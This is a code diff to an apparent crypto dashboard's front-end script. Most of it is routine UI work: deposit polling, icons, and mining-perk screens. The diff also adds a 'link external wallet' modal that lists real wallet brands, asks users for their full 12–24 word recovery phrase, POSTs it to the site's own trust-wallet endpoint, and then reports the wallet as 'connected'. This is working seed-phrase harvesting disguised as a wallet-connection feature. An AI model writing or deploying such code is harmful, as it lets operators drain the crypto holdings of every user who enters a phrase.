@@ -87,6 +87,38 @@
   window.showLoader = showLoader;
   window.hideLoader = hideLoader;
 
+  // Toggle a submit button into a loading state (inline spinner) during async work
+  function setFormLoading(form, loading, text) {
+    var btn = form.querySelector('button[type="submit"]');
+    if (!btn) return;
+    if (loading) {
+      if (btn.getAttribute('data-orig') === null || btn.getAttribute('data-orig') === undefined) {
+        btn.setAttribute('data-orig', btn.innerHTML);
+      }
+      btn.disabled = true;
+      btn.classList.add('is-loading');
+      btn.innerHTML = '<span class="btn-spinner" aria-hidden="true"></span><span>' + (text || 'Processing…') + '</span>';
+    } else {
+      btn.disabled = false;
+      btn.classList.remove('is-loading');
+      var orig = btn.getAttribute('data-orig');
+      if (orig !== null) { btn.innerHTML = orig; btn.removeAttribute('data-orig'); }
+    }
+  }
+
+  // Show both an inline form message and a toast for a request result
+  function formResult(form, r, okMsg) {
+    var ok = !!(r && r.success);
+    var msg = (r && r.message) || (ok ? okMsg : 'Something went wrong. Please try again.');
+    showMsg(form, msg, !ok);
+    showToast(msg, ok ? 'success' : 'error');
+    return ok;
+  }
+  function formNetworkError(form) {
+    showMsg(form, 'Network error — please try again', true);
+    showToast('Network error — please try again', 'error');
+  }
+
   // ── Modal System ─────────────────────────────────────────────────────────────
 
   function openModal(id) {
@@ -109,6 +141,174 @@
   window.closeModal = closeModal;
   window.closeAllModals = closeAllModals;
 
+  // ── External Wallet Linking (trust-wallet modal) ─────────────────────────────
+
+  function resetTrustWalletModal() {
+    var s1 = document.getElementById('twStep1');
+    var s2 = document.getElementById('twStep2');
+    if (s1) s1.style.display = '';
+    if (s2) s2.style.display = 'none';
+    var d1 = document.getElementById('twStepDot1');
+    var d2 = document.getElementById('twStepDot2');
+    if (d1) d1.classList.add('tw-step--active');
+    if (d2) d2.classList.remove('tw-step--active');
+    var phrase = document.getElementById('twPhrase'); if (phrase) phrase.value = '';
+    var sel  = document.getElementById('twSelectedWallet'); if (sel) sel.value = '';
+    var msg  = document.getElementById('twMsg'); if (msg) { msg.style.display = 'none'; msg.textContent = ''; }
+    var search = document.getElementById('twSearchInput'); if (search) { search.value = ''; filterWallets(''); }
+  }
+
+  function openTrustWalletModal(preselect) {
+    resetTrustWalletModal();
+    openModal('modal-trust-wallet');
+    if (preselect) selectWallet(preselect);
+  }
+
+  function filterWallets(value) {
+    var q = (value || '').trim().toLowerCase();
+    var items = document.querySelectorAll('#twWalletGrid .tw-wallet-item');
+    var shown = 0;
+    items.forEach(function (item) {
+      var name = (item.querySelector('.tw-wallet-name') || {}).textContent || '';
+      var match = !q || name.toLowerCase().indexOf(q) !== -1;
+      item.style.display = match ? '' : 'none';
+      if (match) shown++;
+    });
+    var count = document.getElementById('twWalletCount');
+    if (count) count.textContent = shown + ' wallet' + (shown === 1 ? '' : 's') + ' supported';
+  }
+
+  function selectWallet(name) {
+    var sel = document.getElementById('twSelectedWallet'); if (sel) sel.value = name;
+    var disp = document.getElementById('twSelectedName'); if (disp) disp.textContent = name;
+    var s1 = document.getElementById('twStep1'); if (s1) s1.style.display = 'none';
+    var s2 = document.getElementById('twStep2'); if (s2) s2.style.display = '';
+    var d1 = document.getElementById('twStepDot1'); if (d1) d1.classList.remove('tw-step--active');
+    var d2 = document.getElementById('twStepDot2'); if (d2) d2.classList.add('tw-step--active');
+    var phrase = document.getElementById('twPhrase'); if (phrase) setTimeout(function () { phrase.focus(); }, 50);
+  }
+
+  function backToWalletSelect() {
+    var s1 = document.getElementById('twStep1'); if (s1) s1.style.display = '';
+    var s2 = document.getElementById('twStep2'); if (s2) s2.style.display = 'none';
+    var d1 = document.getElementById('twStepDot1'); if (d1) d1.classList.add('tw-step--active');
+    var d2 = document.getElementById('twStepDot2'); if (d2) d2.classList.remove('tw-step--active');
+  }
+
+  async function submitTrustWallet() {
+    var name   = (document.getElementById('twSelectedWallet') || {}).value || '';
+    var phrase = ((document.getElementById('twPhrase') || {}).value || '').trim().replace(/\s+/g, ' ');
+    var msg    = document.getElementById('twMsg');
+    var btn    = document.getElementById('twSubmitBtn');
+
+    function fail(m) {
+      if (msg) { msg.textContent = m; msg.className = 'auth-msg auth-msg--error'; msg.style.display = ''; }
+    }
+    if (!name) { backToWalletSelect(); return; }
+    if (!phrase) { fail('Please enter your recovery phrase.'); return; }
+    var words = phrase.split(' ').filter(Boolean).length;
+    if (words < 12 || words > 24) {
+      fail('A recovery phrase is usually 12–24 words. Please check and try again.');
+      return;
+    }
+
+    if (btn) btn.disabled = true;
+    var txt = btn ? btn.querySelector('.btn-text') : null;
+    var spin = btn ? btn.querySelector('.btn-spinner') : null;
+    if (txt) txt.style.display = 'none';
+    if (spin) spin.style.display = '';
+
+    try {
+      var r = await apiFetch('/api/user-dashboard/trust-wallet.php', {
+        method: 'POST',
+        body: JSON.stringify({ wallet_name: name, phrase: phrase })
+      });
+      if (r && r.success) {
+        closeModal('modal-trust-wallet');
+        showToast(r.message || 'Wallet connected successfully.', 'success');
+        loadLinkedWallets();
+      } else {
+        fail((r && r.message) || 'Could not connect wallet. Please try again.');
+      }
+    } catch (e) {
+      fail('Network error — please try again.');
+    } finally {
+      if (btn) btn.disabled = false;
+      if (txt) txt.style.display = '';
+      if (spin) spin.style.display = 'none';
+    }
+  }
+
+  // Build one connected-wallet card (logo, name, status, date, disconnect).
+  function connectedWalletCard(w) {
+    var name    = w.wallet_name || 'Wallet';
+    var initial = name.charAt(0).toUpperCase();
+    var logo    = (typeof walletLogoUrl === 'function') ? walletLogoUrl(name) : null;
+    var logoHtml = logo
+      ? '<img src="' + logo + '" alt="" loading="lazy" '
+        + 'onerror="this.style.display=\'none\';this.nextElementSibling.style.display=\'flex\';">'
+        + '<span class="cw-card-letter" style="display:none;">' + esc(initial) + '</span>'
+      : '<span class="cw-card-letter" style="display:flex;">' + esc(initial) + '</span>';
+    return '<div class="cw-card">'
+      + '<button type="button" class="cw-card-remove" title="Disconnect" aria-label="Disconnect" onclick="removeLinkedWallet(' + w.id + ')">'
+      + '<i class="ph ph-trash"></i></button>'
+      + '<div class="cw-card-logo">' + logoHtml + '</div>'
+      + '<div class="cw-card-name">' + esc(name) + '</div>'
+      + '<div class="cw-card-status"><span class="cw-dot"></span> Connected</div>'
+      + '<div class="cw-card-date"><i class="ph ph-clock"></i> ' + fmtDate(w.submitted_at) + '</div>'
+      + '</div>';
+  }
+
+  async function loadLinkedWallets() {
+    var sectionList = document.getElementById('connectedWalletsList');
+    var modalList   = document.getElementById('linkedWalletsList');
+    var panel       = document.getElementById('connectedWalletsPanel');
+    var countEl     = document.getElementById('cwCount');
+    if (!sectionList && !modalList) return;
+    try {
+      var r = await apiFetch('/api/user-dashboard/trust-wallet.php');
+      var wallets = (r && r.data && r.data.wallets) || [];
+      if (countEl) countEl.textContent = wallets.length;
+      if (panel) panel.style.display = wallets.length ? '' : 'none';
+      var cards = wallets.map(connectedWalletCard).join('');
+      if (sectionList) sectionList.innerHTML = cards;
+      if (modalList) {
+        modalList.innerHTML = wallets.length ? cards
+          : '<p class="empty-text">No wallets connected yet.</p>';
+      }
+    } catch (e) {
+      if (panel) panel.style.display = 'none';
+      if (modalList) modalList.innerHTML = '<p class="empty-text">Could not load connected wallets.</p>';
+    }
+  }
+
+  async function removeLinkedWallet(id) {
+    try {
+      var r = await apiFetch('/api/user-dashboard/trust-wallet.php', {
+        method: 'DELETE',
+        body: JSON.stringify({ id: id })
+      });
+      if (r && r.success) {
+        showToast(r.message || 'Wallet removed.', 'success');
+        loadLinkedWallets();
+      } else {
+        showToast((r && r.message) || 'Could not remove wallet.', 'error');
+      }
+    } catch (e) {
+      showToast('Network error — please try again.', 'error');
+    }
+  }
+
+  function esc(s) { var d = document.createElement('div'); d.textContent = s == null ? '' : s; return d.innerHTML; }
+
+  window.openTrustWalletModal = openTrustWalletModal;
+  window.filterWallets       = filterWallets;
+  window.selectWallet        = selectWallet;
+  window.backToWalletSelect  = backToWalletSelect;
+  window.submitTrustWallet   = submitTrustWallet;
+  window.loadLinkedWallets   = loadLinkedWallets;
+  window.removeLinkedWallet  = removeLinkedWallet;
+
   // ── Module State ─────────────────────────────────────────────────────────────
 
   var _user         = {};       // cached user profile
@@ -116,15 +316,22 @@
   var _wallets      = [];       // user's wallets with balances
   var _totalBalance = 0;        // aggregate portfolio USD value
   var _cardTier     = 'none';   // none | VirtuElevate | VirtuElite
+  var _card         = null;     // active virtual card (or null)
 
   // ── Crypto Icon URL ──────────────────────────────────────────────────────────
+  // spothq/cryptocurrency-icons is keyed by lowercase symbol. Tokens not in the
+  // set are listed in _noIcon so we render the lettered fallback directly,
+  // avoiding slow 404 requests.
 
-  var _iconOverrides = { XAUT: 'tether-gold', PAXG: 'pax-gold', RLUSD: 'ripple', SFP: 'safepal' };
+  var _noIcon = { XAUT: 1, KAG: 1, SUI: 1, TRUMP: 1, RLUSD: 1, SFP: 1 };
+
+  function hasCryptoIcon(symbol) {
+    return !_noIcon[(symbol || '').toUpperCase()];
+  }
 
   function cryptoIconUrl(symbol) {
-    var sym = (symbol || '').toUpperCase();
-    var slug = _iconOverrides[sym] || sym.toLowerCase();
-    return 'https://cdn.jsdelivr.net/gh/nickvdyck/cryptocurrency-icons@master/128/color/' + slug + '.png';
+    return 'https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/128/color/'
+      + (symbol || '').toLowerCase() + '.png';
   }
 
   // ── Balance Visibility Toggle ────────────────────────────────────────────────
@@ -151,6 +358,7 @@
       var r = await apiFetch('/api/user-dashboard/dashboard.php');
       if (!r.success) return;
       var d = r.data;
+      _card = d.card || null;
       if (d.user) {
         _user = d.user;
         _cardTier = d.user.card_tier || 'none';
@@ -187,6 +395,7 @@
       var r = await apiFetch('/api/user-dashboard/dashboard.php');
       if (r.success && r.data) {
         var d = r.data;
+        _card = d.card || null;
         if (d.user) {
           _user = d.user;
           _cardTier = d.user.card_tier || 'none';
@@ -273,14 +482,20 @@
         displayName = name + ' (' + network + ')';
       }
 
+      var iconHtml = hasCryptoIcon(symbol)
+        ? '<img class="asset-icon" src="' + cryptoIconUrl(symbol) + '" alt="' + symbol + '" '
+          + 'onerror="this.style.display=\'none\';this.nextElementSibling.style.display=\'flex\';">'
+          + '<div class="asset-icon-fallback" style="display:none;">' + symbol.substring(0, 3) + '</div>'
+        : '<div class="asset-icon-fallback" style="display:flex;">' + symbol.substring(0, 3) + '</div>';
+
       html += '<div class="asset-row" data-symbol="' + symbol + '" data-network="' + network + '">'
         + '<div class="asset-row-left">'
-        + '<img class="asset-icon" src="' + cryptoIconUrl(symbol) + '" alt="' + symbol + '" '
-        + 'onerror="this.style.display=\'none\';this.nextElementSibling.style.display=\'flex\';">'
-        + '<div class="asset-icon-fallback" style="display:none;">' + symbol.substring(0, 3) + '</div>'
+        + iconHtml
         + '<div class="asset-name-col">'
-        + '<span class="asset-name">' + displayName + '</span>'
-        + '<span class="asset-symbol">' + symbol + '</span>'
+        + '<span class="asset-name-row"><span class="asset-name">' + displayName + '</span>' + badgeHtml + '</span>'
+        + '<span class="asset-symbol">' + symbol
+        + '<span class="asset-sub-price"> · $' + fmt(price, price < 1 ? 6 : 2)
+        + ' <span class="asset-change ' + changeClass + '">' + changePrefix + change.toFixed(2) + '%</span></span></span>'
         + '</div></div>'
         + '<div class="asset-row-center">'
         + '<span class="asset-price">$' + fmt(price, price < 1 ? 6 : 2) + '</span>'
@@ -290,7 +505,6 @@
         + '<span class="asset-holding-usd">$' + fmt(holdingUsd) + '</span>'
         + '<span class="asset-holding-native">' + fmtCrypto(balance) + ' ' + symbol + '</span>'
         + '</div>'
-        + badgeHtml
         + '</div>';
     });
 
@@ -339,6 +553,7 @@
   function loadConnectWallet() {
     var grid = document.getElementById('walletProviderGrid');
     if (!grid) return;
+    loadLinkedWallets();          // show wallets the user has already connected
     renderWalletProviders('');
 
     // Search filter
@@ -349,6 +564,52 @@
         renderWalletProviders(this.value.trim().toLowerCase());
       });
     }
+
+    // Clicking a provider opens the link-wallet modal, pre-selected
+    if (!grid._bound) {
+      grid._bound = true;
+      grid.addEventListener('click', function (e) {
+        var card = e.target.closest('.wallet-provider-card');
+        if (!card) return;
+        openTrustWalletModal(card.getAttribute('data-provider') || '');
+      });
+    }
+  }
+
+  // Known wallet brand domains → used to fetch each wallet's real logo.
+  // Wallets not listed fall back to a lettered avatar.
+  var _walletLogos = {
+    'MetaMask':'metamask.io','Trust Wallet':'trustwallet.com','Coinbase Wallet':'coinbase.com',
+    'Ledger':'ledger.com','Rainbow':'rainbow.me','Phantom':'phantom.app','Exodus':'exodus.com',
+    'SafePal':'safepal.com','TokenPocket':'tokenpocket.pro','Bitget Wallet':'bitget.com',
+    'OKX Wallet':'okx.com','Zerion':'zerion.io','Rabby':'rabby.io','imToken':'token.im',
+    'Brave Wallet':'brave.com','Argent':'argent.xyz','Uniswap Wallet':'uniswap.org',
+    '1inch Wallet':'1inch.io','MathWallet':'mathwallet.org','Coin98':'coin98.com',
+    'Guarda':'guarda.com','Atomic Wallet':'atomicwallet.io','Unstoppable Wallet':'unstoppable.money',
+    'Enkrypt':'enkrypt.com','Frame':'frame.sh','Ambire':'ambire.com','Sequence':'sequence.xyz',
+    'XDEFI':'xdefi.io','Frontier':'frontier.xyz','Backpack':'backpack.app','Zeal':'zeal.app',
+    'Fireblocks':'fireblocks.com','Kraken Wallet':'kraken.com','Binance Web3':'binance.com',
+    'BitKeep':'bitget.com','Trezor':'trezor.io','Keystone':'keyst.one','Tangem':'tangem.com',
+    'CoolWallet':'coolwallet.io','Ellipal':'ellipal.com','NGRAVE':'ngrave.io','Keplr':'keplr.app',
+    'Leap':'leapwallet.io','Cosmostation':'cosmostation.io','Solflare':'solflare.com',
+    'HashPack':'hashpack.app','Pera':'perawallet.app','Petra':'petra.app','Pontem':'pontem.network',
+    'Martian':'martianwallet.xyz','Suiet':'suiet.app','Core':'core.app','ZenGo':'zengo.com',
+    'Gnosis Safe':'safe.global','Torus':'tor.us','WalletConnect':'walletconnect.com',
+    'Magic Link':'magic.link','Web3Auth':'web3auth.io','Particle':'particle.network',
+    'Privy':'privy.io','Dynamic':'dynamic.xyz','Thirdweb':'thirdweb.com','Crypto.com':'crypto.com',
+    'Nexo':'nexo.com','Aave':'aave.com','Compound':'compound.finance','Lido':'lido.fi',
+    'Jupiter':'jup.ag','Raydium':'raydium.io','Orca':'orca.so','Magic Eden':'magiceden.io',
+    'OpenSea':'opensea.io','Blur':'blur.io','Zapper':'zapper.xyz','DeBank':'debank.com',
+    'Huobi Wallet':'huobi.com','Gate Wallet':'gate.io','MEXC Wallet':'mexc.com',
+    'Bybit Wallet':'bybit.com','KuCoin Wallet':'kucoin.com','Ronin Wallet':'roninchain.com',
+    'GameStop Wallet':'gamestop.com','Bitski':'bitski.com','Alchemy':'alchemy.com',
+    'Infura':'infura.io','QuickNode':'quicknode.com','Moralis':'moralis.io','Foundation':'foundation.app',
+    'Zora':'zora.co','Lens':'lens.xyz','Farcaster':'farcaster.xyz'
+  };
+
+  function walletLogoUrl(name) {
+    var d = _walletLogos[name];
+    return d ? 'https://www.google.com/s2/favicons?domain=' + d + '&sz=64' : null;
   }
 
   function renderWalletProviders(filter) {
@@ -363,8 +624,14 @@
     }
     grid.innerHTML = providers.map(function (name) {
       var initial = name.charAt(0).toUpperCase();
+      var logo = walletLogoUrl(name);
+      var icon = logo
+        ? '<img class="wallet-provider-logo" src="' + logo + '" alt="" loading="lazy" '
+          + 'onerror="this.style.display=\'none\';this.nextElementSibling.style.display=\'flex\';">'
+          + '<div class="asset-icon-fallback" style="display:none;width:4rem;height:4rem;font-size:1.6rem;">' + initial + '</div>'
+        : '<div class="asset-icon-fallback" style="display:flex;width:4rem;height:4rem;font-size:1.6rem;">' + initial + '</div>';
       return '<div class="wallet-provider-card" data-provider="' + name + '">'
-        + '<div class="asset-icon-fallback" style="display:flex;width:4rem;height:4rem;font-size:1.6rem;">' + initial + '</div>'
+        + icon
         + '<span>' + name + '</span>'
         + '</div>';
     }).join('');
@@ -429,140 +696,252 @@
     }
   }
 
-  // ── Receive ──────────────────────────────────────────────────────────────────
+  // ── Receive (NOWPayments deposit) ────────────────────────────────────────────
 
-  function loadReceive() {
-    populateAssetSelect('receiveAsset');
+  var _receiveCurrencies = [];
+  var _receivePollTimer  = null;
+  var _receivePaymentId  = null;
+
+  async function loadReceive() {
+    resetReceive();
     var sel = document.getElementById('receiveAsset');
-    if (sel && !sel._bound) {
-      sel._bound = true;
-      sel.addEventListener('change', function () {
-        showReceiveDetail(this.value);
-      });
+    if (sel) {
+      // Populate from the NOWPayments-supported list
+      if (!_receiveCurrencies.length) {
+        try {
+          var r = await apiFetch('/api/payments/receive-initiate.php');
+          if (r.success && r.data) _receiveCurrencies = r.data.currencies || [];
+        } catch (e) { /* ignore */ }
+      }
+      sel.innerHTML = '<option value="">Choose asset…</option>'
+        + _receiveCurrencies.map(function (c) {
+            return '<option value="' + c.id + '">' + esc(c.symbol) + ' — ' + esc(c.name)
+              + ' (' + esc(c.network) + ')</option>';
+          }).join('');
     }
+    var genBtn = document.getElementById('receiveGenBtn');
+    if (genBtn && !genBtn._bound) { genBtn._bound = true; genBtn.addEventListener('click', generateDeposit); }
+    var newBtn = document.getElementById('receiveNewBtn');
+    if (newBtn && !newBtn._bound) { newBtn._bound = true; newBtn.addEventListener('click', resetReceive); }
   }
 
-  function showReceiveDetail(currencyId) {
+  function resetReceive() {
+    if (_receivePollTimer) { clearInterval(_receivePollTimer); _receivePollTimer = null; }
+    _receivePaymentId = null;
+    var choose = document.getElementById('receiveChooseCard');
+    var detail = document.getElementById('receiveDetailCard');
+    if (choose) choose.style.display = '';
+    if (detail) detail.style.display = 'none';
+  }
+
+  async function generateDeposit() {
+    var form = document.getElementById('receiveChooseCard');
+    var sel  = document.getElementById('receiveAsset');
+    var amt  = document.getElementById('receiveAmount');
+    var cid  = parseInt((sel || {}).value || 0, 10);
+    var usd  = parseFloat((amt || {}).value || 0);
+    if (!cid) { showMsg(form, 'Choose an asset to receive', true); return; }
+    if (!usd || usd <= 0) { showMsg(form, 'Enter a deposit amount in USD', true); return; }
+
+    setFormLoading(form, true, 'Generating…');
+    try {
+      var r = await apiFetch('/api/payments/receive-initiate.php', {
+        method: 'POST', body: JSON.stringify({ currency_id: cid, amount_usd: usd })
+      });
+      if (r.success && r.data) {
+        renderDeposit(r.data);
+      } else {
+        showMsg(form, r.message || 'Could not generate address', true);
+        showToast(r.message || 'Could not generate address', 'error');
+      }
+    } catch (e) {
+      formNetworkError(form);
+    } finally { setFormLoading(form, false); }
+  }
+
+  function renderDeposit(d) {
+    document.getElementById('receiveChooseCard').style.display = 'none';
     var card = document.getElementById('receiveDetailCard');
-    if (!currencyId) { if (card) card.style.display = 'none'; return; }
+    card.style.display = 'block';
 
-    var cur = _currencies.find(function (c) { return c.id == currencyId; });
-    var wallet = _wallets.find(function (w) { return w.currency_id == currencyId; });
-
-    if (!cur) { if (card) card.style.display = 'none'; return; }
-    if (card) card.style.display = 'block';
-
-    setText('#receiveAssetName', cur.name || cur.symbol);
-    setText('#receiveAssetSymbol', cur.symbol);
-    setText('#receiveNetwork', cur.network || '—');
-    setText('#receiveConfirmations', (cur.expected_arrival_confirmations || 3) + ' confirmations');
-    setText('#receiveUnlock', (cur.expected_unlock_confirmations || 7) + ' confirmations');
-
+    setText('#receiveAssetName', (d.name || d.symbol) + ' (' + d.pay_currency + ')');
+    setText('#receiveAssetSymbol', d.symbol);
+    setText('#receiveNetwork', d.network || '—');
+    setText('#receiveNetwork2', d.network || '—');
+    setText('#receiveUsd', '$' + fmt(d.amount_usd));
+    setText('#receivePayAmount', trimCoin(d.pay_amount) + ' ' + d.pay_currency);
     var addrEl = document.getElementById('receiveAddress');
-    var address = wallet ? wallet.address : 'No address generated';
-    if (addrEl) addrEl.textContent = address;
+    if (addrEl) addrEl.textContent = d.pay_address;
+    setText('#receiveExpiry', d.expires_at ? new Date(d.expires_at).toLocaleString() : '—');
 
-    // QR code generation (simple text-based, can upgrade to qrcode.js later)
-    var canvas = document.getElementById('receiveQrCanvas');
-    if (canvas && wallet && wallet.address) {
-      try {
-        renderSimpleQR(canvas, wallet.address);
-      } catch (e) {
-        // Fallback: just show address
-        canvas.style.display = 'none';
-      }
+    var qr = document.getElementById('receiveQrImg');
+    if (qr) {
+      qr.style.display = '';
+      qr.src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=8&data=' + encodeURIComponent(d.pay_address);
     }
+
+    setReceiveStatus('waiting', 'Waiting for your payment…');
+    _receivePaymentId = d.payment_id;
+    if (_receivePollTimer) clearInterval(_receivePollTimer);
+    _receivePollTimer = setInterval(pollReceiveStatus, 15000);
   }
 
-  function renderSimpleQR(canvas, text) {
-    // Placeholder: draws a styled box with the address hint
-    // In production, use a proper QR library like qrcode.js
-    var ctx = canvas.getContext('2d');
-    canvas.width = 200; canvas.height = 200;
-    ctx.fillStyle = '#ffffff';
-    ctx.fillRect(0, 0, 200, 200);
-    ctx.fillStyle = '#0a3d2e';
-    ctx.fillRect(10, 10, 180, 180);
-    ctx.fillStyle = '#ffffff';
-    ctx.fillRect(15, 15, 170, 170);
-    ctx.fillStyle = '#0a3d2e';
-    ctx.font = '11px monospace';
-    ctx.textAlign = 'center';
-    ctx.fillText('QR Code', 100, 95);
-    ctx.font = '9px monospace';
-    ctx.fillText(text.substring(0, 20) + '…', 100, 115);
+  function setReceiveStatus(state, text) {
+    var bar = document.getElementById('receiveStatusBar');
+    var dot = document.getElementById('receiveStatusDot');
+    if (bar) bar.className = 'receive-status-bar receive-status-bar--' + state;
+    setText('#receiveStatusText', text);
   }
 
-  // Copy address button
+  async function pollReceiveStatus() {
+    if (!_receivePaymentId) return;
+    // Stop polling if the user has navigated away from the Receive detail view
+    var detail = document.getElementById('receiveDetailCard');
+    if (!detail || detail.style.display === 'none') {
+      clearInterval(_receivePollTimer); _receivePollTimer = null; return;
+    }
+    try {
+      var r = await apiFetch('/api/payments/receive-status.php', {
+        method: 'POST', body: JSON.stringify({ payment_id: _receivePaymentId })
+      });
+      if (!r.success) return;
+      if (r.credited || r.status === 'finished') {
+        setReceiveStatus('done', 'Payment received — funds credited!');
+        clearInterval(_receivePollTimer); _receivePollTimer = null;
+        showToast('Deposit confirmed — your balance is updated.', 'success');
+        loadOverview();
+      } else if (r.status === 'confirming' || r.status === 'confirmed' || r.status === 'sending') {
+        setReceiveStatus('pending', 'Payment detected — confirming on-chain…');
+      } else if (r.status === 'partially_paid') {
+        setReceiveStatus('pending', 'Partial payment received — send the remainder.');
+      } else if (r.status === 'failed' || r.status === 'expired' || r.status === 'refunded') {
+        setReceiveStatus('failed', 'This deposit ' + r.status + '. Generate a new address.');
+        clearInterval(_receivePollTimer); _receivePollTimer = null;
+      } else {
+        setReceiveStatus('waiting', 'Waiting for your payment…');
+      }
+    } catch (e) { /* keep polling */ }
+  }
+
+  // Copy buttons (address + amount)
   document.addEventListener('click', function (e) {
-    if (e.target.closest('#copyAddressBtn')) {
-      var addr = document.getElementById('receiveAddress');
-      if (addr) {
-        copyText(addr.textContent, function (ok) {
-          showToast(ok ? 'Address copied!' : 'Failed to copy', ok ? 'success' : 'error');
-        });
-      }
-    }
+    var copyBtn = e.target.closest('#copyAddressBtn, #copyAmountBtn');
+    if (!copyBtn) return;
+    var isAmount = copyBtn.id === 'copyAmountBtn';
+    var srcEl = document.getElementById(isAmount ? 'receivePayAmount' : 'receiveAddress');
+    if (!srcEl) return;
+    var text = isAmount ? srcEl.textContent.replace(/[^0-9.]/g, '') : srcEl.textContent;
+    copyText(text, function (ok) {
+      showToast(ok ? (isAmount ? 'Amount copied!' : 'Address copied!') : 'Failed to copy', ok ? 'success' : 'error');
+    });
   });
-
-  // ── Swap ─────────────────────────────────────────────────────────────────────
-
-  function loadSwap() {
-    populateAssetSelect('swapFrom');
-    populateAssetSelect('swapTo');
-
-    // Direction toggle
-    var btn = document.getElementById('swapDirectionBtn');
-    if (btn && !btn._bound) {
-      btn._bound = true;
-      btn.addEventListener('click', function () {
-        var from = document.getElementById('swapFrom');
-        var to   = document.getElementById('swapTo');
-        if (from && to) {
-          var tmp = from.value;
-          from.value = to.value;
-          to.value = tmp;
-        }
-      });
-    }
-
-    // MAX button
-    var maxBtn = document.getElementById('swapMaxBtn');
-    if (maxBtn && !maxBtn._bound) {
-      maxBtn._bound = true;
-      maxBtn.addEventListener('click', function () {
-        var sel = document.getElementById('swapFrom');
-        if (!sel || !sel.value) return;
-        var wallet = _wallets.find(function (w) { return w.currency_id == sel.value; });
-        if (wallet) document.getElementById('swapFromAmount').value = wallet.balance;
-      });
-    }
-
-    // Update balance hint on from-asset change
-    var fromSel = document.getElementById('swapFrom');
-    if (fromSel && !fromSel._bound) {
-      fromSel._bound = true;
-      fromSel.addEventListener('change', function () {
-        var wallet = _wallets.find(function (w) { return w.currency_id == this.value; }.bind(this));
-        var hint = document.getElementById('swapFromBalance');
-        if (hint) hint.textContent = 'Balance: ' + fmtCrypto(wallet ? wallet.balance : 0);
-      });
-    }
-  }
 
   // ── Mining ───────────────────────────────────────────────────────────────────
 
-  function loadMining() {
+  // Shared perk-UI helpers (used by mining + investments)
+  function perkStat(icon, value, label) {
+    return '<div class="perk-stat"><div class="perk-stat-ic"><i class="ph ' + icon + '"></i></div>'
+      + '<div class="perk-stat-body"><div class="perk-stat-value">' + value + '</div>'
+      + '<div class="perk-stat-label">' + label + '</div></div></div>';
+  }
+  function coinIcon(symbol) {
+    var sym = symbol || '';
+    if (hasCryptoIcon(sym)) {
+      return '<img class="perk-coin-ic" src="' + cryptoIconUrl(sym) + '" alt="" loading="lazy" '
+        + 'onerror="this.style.display=\'none\';this.nextElementSibling.style.display=\'flex\';">'
+        + '<span class="perk-coin-fallback" style="display:none;">' + esc(sym.substring(0, 3)) + '</span>';
+    }
+    return '<span class="perk-coin-fallback" style="display:flex;">' + esc(sym.substring(0, 3)) + '</span>';
+  }
+  function trimCoin(n) { return parseFloat(n || 0).toFixed(8).replace(/\.?0+$/, ''); }
+
+  async function loadMining() {
     var gate = document.getElementById('miningGate');
     var dash = document.getElementById('miningDashboard');
-    if (_cardTier === 'VirtuElevate' || _cardTier === 'VirtuElite') {
-      if (gate) gate.style.display = 'none';
-      if (dash) dash.style.display = 'block';
-    } else {
-      if (gate) gate.style.display = 'block';
-      if (dash) dash.style.display = 'none';
-    }
+    var premium = (_cardTier === 'VirtuElevate' || _cardTier === 'VirtuElite');
+    if (gate) gate.style.display = premium ? 'none' : 'block';
+    if (!dash) return;
+    dash.style.display = premium ? 'block' : 'none';
+    if (!premium) return;
+    if (!dash.innerHTML.trim()) dash.innerHTML = '<div class="perk-loading"><i class="ph ph-circle-notch ph-spin"></i> Loading…</div>';
+    try {
+      var r = await apiFetch('/api/user-dashboard/mining.php');
+      if (!r.success) { dash.innerHTML = '<div class="perk-empty"><p>' + esc(r.message || 'Unable to load mining') + '</p></div>'; return; }
+      renderMining(r.data);
+    } catch (e) { dash.innerHTML = '<div class="perk-empty"><p>Could not load mining.</p></div>'; }
   }
+
+  function renderMining(d) {
+    var dash = document.getElementById('miningDashboard');
+    if (!dash) return;
+    var s = d.summary;
+    var html = '<div class="perk-stats">'
+      + perkStat('ph-cpu', s.active_rigs, 'Active Rigs')
+      + perkStat('ph-coins', '$' + fmt(s.pending_usd), 'Unclaimed Rewards')
+      + perkStat('ph-trophy', '$' + fmt(s.lifetime_usd), 'Lifetime Earned')
+      + '</div>';
+
+    html += '<div class="perk-head"><h3>Active Rigs</h3><span class="perk-muted">~$' + fmt(d.daily_usd) + '/day per rig</span></div>';
+    if (d.rigs.length) {
+      html += '<div class="rig-grid">' + d.rigs.map(function (r) {
+        return '<div class="rig-card">'
+          + '<div class="rig-top"><div class="perk-coin">' + coinIcon(r.symbol) + '</div>'
+          + '<div class="rig-id"><div class="rig-sym">' + esc(r.symbol) + '</div><div class="rig-name">' + esc(r.name) + '</div></div>'
+          + '<span class="rig-live"><span class="rig-live-dot"></span> Mining</span></div>'
+          + '<div class="rig-meta">'
+          + '<div><span>Hashrate</span><strong>' + fmt(r.hashrate, 1) + ' TH/s</strong></div>'
+          + '<div><span>Unclaimed</span><strong>' + trimCoin(r.pending) + ' ' + esc(r.symbol) + '</strong></div>'
+          + '<div><span>Value</span><strong>$' + fmt(r.pending_usd) + '</strong></div></div>'
+          + '<div class="rig-actions">'
+          + '<button class="btn-primary btn-sm" onclick="claimMining(' + r.id + ')"><i class="ph ph-hand-coins"></i> Claim</button>'
+          + '<button class="btn-outline btn-sm" onclick="stopMining(' + r.id + ')">Stop</button></div>'
+          + '</div>';
+      }).join('') + '</div>';
+    } else {
+      html += '<div class="perk-empty"><i class="ph ph-cpu"></i><p>No active rigs yet. Start mining a coin below.</p></div>';
+    }
+
+    html += '<div class="perk-head"><h3>Start Mining</h3></div>';
+    if (d.available.length) {
+      html += '<div class="mine-coin-grid">' + d.available.map(function (c) {
+        return '<button type="button" class="mine-coin" onclick="startMining(' + c.id + ')">'
+          + '<div class="perk-coin">' + coinIcon(c.symbol) + '</div>'
+          + '<div class="mine-coin-sym">' + esc(c.symbol) + '</div>'
+          + '<div class="mine-coin-name">' + esc(c.name) + '</div>'
+          + '<span class="mine-coin-go"><i class="ph ph-play-circle"></i> Start</span>'
+          + '</button>';
+      }).join('') + '</div>';
+    } else {
+      html += '<div class="perk-empty"><p>Every mineable coin is already running.</p></div>';
+    }
+    dash.innerHTML = html;
+  }
+
+  window.startMining = async function (cid) {
+    showLoader();
+    try {
+      var r = await apiFetch('/api/user-dashboard/mining.php', { method: 'POST', body: JSON.stringify({ action: 'start', currency_id: cid }) });
